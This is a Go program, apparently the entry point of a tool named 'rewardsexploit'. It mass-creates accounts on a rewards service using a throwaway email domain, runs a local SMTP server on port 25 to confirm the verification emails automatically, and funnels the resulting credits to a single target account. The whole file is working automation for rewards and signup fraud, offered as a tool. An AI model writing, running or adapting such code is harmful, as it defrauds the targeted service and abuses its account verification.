package main

import (
	"flag"
	"github.com/lc/rewardsexploit/pkg/av"
	"github.com/lc/rewardsexploit/pkg/creator"
	"github.com/mhale/smtpd"
	"github.com/sirupsen/logrus"
	"log"
	"sync"
	"time"
)

func main() {
	accNum := flag.Int("num",1, "number of accounts to create")
	emailDomain := flag.String("e","hackerone.cloud", "email domain for accounts")
	to := flag.String("to", "corben@example.com", "account to transfer credits to")
	verbose := flag.Bool("v",false,"enable verbose output")

	flag.Parse()

		verifier := av.NewAccountVerifier(*to)
		verifyWg := &sync.WaitGroup{}
		verifyWg.Add(1)

		go func() {
			log.Fatal(smtpd.ListenAndServe(":25", verifier.Handler, "ConfirmAcc", ""))
			verifyWg.Done()
		}()

		cr := creator.NewAccountCreator(*emailDomain)
		for i := 0; i < *accNum; i++ {
			acc, err := cr.CreateAccount()
			if err != nil {
				if *verbose {
					logrus.WithFields(logrus.Fields{"func": "cr.CreateAccount"}).Errorf("could not create account: %v", err)
				}
			} else {
				if *verbose {
					logrus.WithFields(logrus.Fields{"func": "cr.CreateAccount"}).Infof("created account: %s", acc)
				}
			}
			time.Sleep(10 * time.Second)
		}

		verifyWg.Wait()
}
